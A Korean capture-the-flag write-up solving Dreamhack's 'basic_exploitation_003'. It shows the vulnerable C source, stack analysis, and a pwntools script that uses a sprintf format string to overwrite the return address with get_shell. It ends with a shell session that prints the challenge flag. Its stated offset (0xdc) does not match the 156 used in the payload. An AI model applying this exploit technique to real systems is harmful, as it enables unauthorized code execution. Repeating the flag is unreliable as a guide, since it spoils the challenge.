# 문제 코드
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```


# 분석
```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/basic_exploitation_003]
└─$ checksec basic_exploitation_003
[*] '/home/foo1/Desktop/Dreamhack/basic_exploitation_003/basic_exploitation_003'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


코드에서 힙에 사용자가 입력한 데이터를 입력받은 후 다시 스택에 데이터를 입력받는 형태임
그런데 힙에서 스택으로 이동할 때 sprintf로 출력하게 되는데, 
사용자가 자유롭게 포멧스트링을 넣을 수 있고, partial RELRO이므로 SFP 취약점이 발생

이전에 포멧스트링 관련 취약점을 이용할 때, %hn등으로 나눠서 공격하는 경우가 많았는데,
여기서는 어떤 주소를 입력하는 것이 아닌 리턴까지의 오프셋에 대한 값만 넣어주면 되므로 큰 수에 대한 처리가 필요가 없음
그리고 %n과 같은 입력 관련 포맷스트링을 이용하는 것이 아닌, 단순히 오프셋만큼 쓰레기 값을 넣어주는 역할을 하는데 포맷스트링을 사용하는 것뿐임

따라서 리턴까지의 오프셋만 알아내기만 하면 됨(0xdc)
```sh
pwndbg> telescope 80
00:0000│ esp 0xffffcf48 —▸ 0xffffcf50 ◂— 'aaaaaaaa\n'
01:0004│-09c 0xffffcf4c —▸ 0x804b1a0 ◂— 'aaaaaaaa\n'
02:0008│-098 0xffffcf50 ◂— 'aaaaaaaa\n'
03:000c│-094 0xffffcf54 ◂— 'aaaa\n'
04:0010│-090 0xffffcf58 ◂— 0xa /* '\n' */
05:0014│-08c 0xffffcf5c ◂— 0x0
... ↓        32 skipped
26:0098│ edi 0xffffcfe0 —▸ 0x804b1a0 ◂— 'aaaaaaaa\n'
27:009c│-004 0xffffcfe4 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
28:00a0│ ebp 0xffffcfe8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
29:00a4│+004 0xffffcfec —▸ 0xf7c21519 (__libc_start_call_main+121) ◂— add esp, 0x10
2a:00a8│+008 0xffffcff0 ◂— 0x1
...
```

# exploit
```python
from pwn import *

p=remote("host3.dreamhack.games",23842)
#p=process("./basic_exploitation_003")
#p=gdb.debug("./basic_exploitation_003")
e=ELF("./basic_exploitation_003")
#context.log_level='DEBUG'

get_shell=e.symbols["get_shell"] #0x080491a6

payload=b''
payload+=b'%156c'
payload+=p32(get_shell)

p.send(payload)

p.interactive()
```

# 결과
```sh
┌──(foo1㉿main-server)-[~/Desktop/Dreamhack/basic_exploitation_003]
└─$ python3 exploit.py 
[+] Opening connection to host3.dreamhack.games on port 23842: Done
[*] '/home/foo1/Desktop/Dreamhack/basic_exploitation_003/basic_exploitation_003'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Switching to interactive mode
ECHO :                                                                                                                                                             i\x86\x0
$ ls
basic_exploitation_003
flag
$ cat flag
DH{4e6e355c62249b2da3b566f0d575007e}[*] Got EOF while reading in interactive
$  
```